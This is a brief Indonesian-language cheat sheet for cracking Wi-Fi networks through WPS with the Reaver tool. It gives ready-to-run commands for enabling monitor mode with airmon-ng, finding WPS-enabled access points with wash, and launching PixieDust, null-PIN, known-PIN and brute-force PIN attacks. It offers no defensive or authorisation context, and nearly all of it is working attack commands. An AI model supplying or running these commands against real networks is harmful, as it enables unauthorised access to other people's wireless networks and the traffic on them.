# Reaver

#### 1. Aktifkan Mode Monitor

```
airmon-ng check kill
airmon-ng start [interface]
```

#### 2. Scan Wi-Fi WPS

```
wash -i [interface]
```

#### 3. Jalankan Serangan

PixieDust Attack:

```
reaver -i [interface] -b [bssid] -c [channel] -vv -K
```

Null PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -p 00000000 -vv
```

> [!IMPORTANT]
> Kalau `-p 00000000` gagal, gunakan `-p ""`.

Known PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -p [pin] -vv
```

PIN Brute Force Attack:

```
reaver -i [interface] -b [bssid] -c [channel] -vv
```
